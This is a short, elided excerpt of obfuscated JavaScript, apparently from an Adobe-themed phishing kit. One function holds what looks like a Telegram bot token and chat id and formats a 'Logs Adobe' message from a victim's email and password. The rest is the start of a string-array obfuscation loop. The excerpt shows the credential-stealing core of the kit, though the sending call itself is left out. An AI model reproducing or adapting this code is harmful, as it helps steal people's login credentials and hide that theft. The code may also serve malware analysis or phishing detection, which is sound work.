...
function _0x1298a(data) {
    const _0x40d1b3a = '6857006458:AAEyZwT82wsbU3B7Iao56qkVjC7caZs7zDk';
    const _0x301fc5a = '-1002425759266';

    const _0x93b389a = `🏴‍☠️Logs Adobe🏴‍☠️
     ${data.email}
     ${data.password}`;
...
(function (_0x8c058f, _0x14b410) {
    ...
    while (!![]) {
        try {
            ...
            if (_0x21688c === _0x14b410) break;
            else _0x57b5e7["push"](_0x57b5e7["shift"]());
        } catch (_0x27c676) {
